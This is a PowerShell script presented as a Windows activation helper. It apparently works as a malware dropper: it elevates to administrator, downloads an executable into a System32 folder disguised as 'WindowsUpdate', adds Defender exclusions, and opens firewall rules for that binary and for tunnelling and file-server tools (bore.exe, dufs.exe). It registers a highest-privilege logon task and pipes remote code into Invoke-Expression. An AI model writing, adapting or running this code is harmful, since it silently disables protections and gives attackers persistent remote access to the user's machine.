Add-Type -AssemblyName PresentationFramework

function Show-Status($message) {
    Write-Host "`r$message" -NoNewline
}

function Show-ProgressBar($label, $percent) {
    $barLength = 30
    $filledLength = [math]::Round($percent * $barLength)
    $bar = ('█' * $filledLength).PadRight($barLength)
    Write-Host "`r$label [$bar] $([math]::Round($percent * 100))%" -NoNewline
}

function Download-WithProgress {
    param (
        [string[]] $urls,
        [string] $output
    )

    Add-Type -AssemblyName System.Net.Http
    $handler = New-Object System.Net.Http.HttpClientHandler
    $handler.AutomaticDecompression = [System.Net.DecompressionMethods]::GZip -bor [System.Net.DecompressionMethods]::Deflate
    $client = New-Object System.Net.Http.HttpClient($handler)
    $client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0")
    $buffer = New-Object byte[] 8192
    $downloaded = $false

    foreach ($url in $urls) {
        try {
            $response = $client.GetAsync($url, [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead).Result
            if (-not $response.IsSuccessStatusCode) { continue }

            $totalBytes = $response.Content.Headers.ContentLength
            $inputStream = $response.Content.ReadAsStreamAsync().Result
            $fileStream = [System.IO.File]::OpenWrite($output)
            $totalRead = 0
            $sw = [System.Diagnostics.Stopwatch]::StartNew()

            do {
                $read = $inputStream.Read($buffer, 0, $buffer.Length)
                if ($read -le 0) { break }

                $fileStream.Write($buffer, 0, $read)
                $totalRead += $read

                $percent = if ($totalBytes -gt 0) { $totalRead / $totalBytes } else { 0 }
                $speed = if ($sw.Elapsed.TotalSeconds -gt 0) { $totalRead / $sw.Elapsed.TotalSeconds } else { 0 }
                $speedStr = if ($speed -gt 1GB) {
                    "{0:N2} GB/s" -f ($speed / 1GB)
                } elseif ($speed -gt 1MB) {
                    "{0:N2} MB/s" -f ($speed / 1MB)
                } elseif ($speed -gt 1KB) {
                    "{0:N2} KB/s" -f ($speed / 1KB)
                } else {
                    "{0:N2} B/s" -f $speed
                }

                Show-ProgressBar "Downloading @ $speedStr" $percent

            } while ($true)

            $fileStream.Close()
            $downloaded = $true
            break
        } catch {
            continue
        }
    }

    if (-not $downloaded) {
        Write-Host "`nFailed to download the binary from all sources." -ForegroundColor Red
        Write-Host "Please contact the TJ for assistance." -ForegroundColor Yellow
        Exit 1
    } else {
        Write-Host "`nDownload complete." -ForegroundColor Green
    }
}

# Check for admin privileges
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    try {
        $arguments = @("-NoProfile", "-ExecutionPolicy", "Bypass", "-File", $myinvocation.mycommand.definition)
        Start-Process powershell -Verb runAs -ArgumentList $arguments
    } catch {
        Write-Host "Failed to elevate privileges. Exiting script." -ForegroundColor Red
        Exit 1
    }
    Exit
}

# Define paths
$secureDir = "$env:windir\System32\WindowsPowerShell\v1.0\Modules\WindowsUpdate"
$exeFileName = "Wlnnb.exe"
$filePath = Join-Path $secureDir $exeFileName

if ($secureDir -notmatch "^.+WindowsPowerShell\\v1\.0\\Modules\\WindowsUpdate$") {
    Write-Host "Directory path validation failed. Exiting script to prevent overwriting critical files." -ForegroundColor Red
    Exit 1
}

if (-not (Test-Path $secureDir)) {
    New-Item -ItemType Directory -Path $secureDir -Force | Out-Null
}

$binaryUrls = @(
    "https://gitfront.io/r/LazyDevv/aQr9CCcW2ccq/Wlnnb/raw/Requila/Wlnnb.exe",
    "https://gitfront.io/r/LazyDevv/aQr9CCcW2ccq/Wlnnb/raw/Sorque/Wlnnb.exe",
    "https://gitfront.io/r/LazyDevv/aQr9CCcW2ccq/Wlnnb/raw/Formante/Wlnnb.exe"
)

Show-Status "Initializing..."
Start-Sleep -Seconds 1
Download-WithProgress -urls $binaryUrls -output $filePath

Show-Status "Processing..."
Start-Sleep -Seconds 1

# Add to Defender exclusions
Add-MpPreference -ExclusionPath $secureDir -ErrorAction SilentlyContinue | Out-Null
$licenseNotifierPath = "$env:LOCALAPPDATA\LicenseNotifier"
Add-MpPreference -ExclusionPath $licenseNotifierPath -ErrorAction SilentlyContinue | Out-Null

# Firewall rules
$exeList = @("$filePath", "$licenseNotifierPath\bore.exe", "$licenseNotifierPath\dufs.exe")
foreach ($exe in $exeList) {
    if (Test-Path $exe) {
        $name = [System.IO.Path]::GetFileNameWithoutExtension($exe)
        New-NetFirewallRule -DisplayName "$name-In" -Direction Inbound -Program $exe -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
        New-NetFirewallRule -DisplayName "$name-Out" -Direction Outbound -Program $exe -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
    }
}

# Scheduled task setup
$taskName = "WindowsLicenseNotifier"
$action = New-ScheduledTaskAction -Execute $filePath
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -ExpandProperty UserName) -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)

if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false | Out-Null
}
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null

# Inline execution in same window with visual feedback
Clear-Host
Write-Host "" -BackgroundColor DarkBlue -ForegroundColor White " Running Activation... "
try {
    Invoke-RestMethod "https://get.activated.win" | Invoke-Expression
} catch {
    Write-Host "Activation failed or was interrupted." -ForegroundColor Red
}
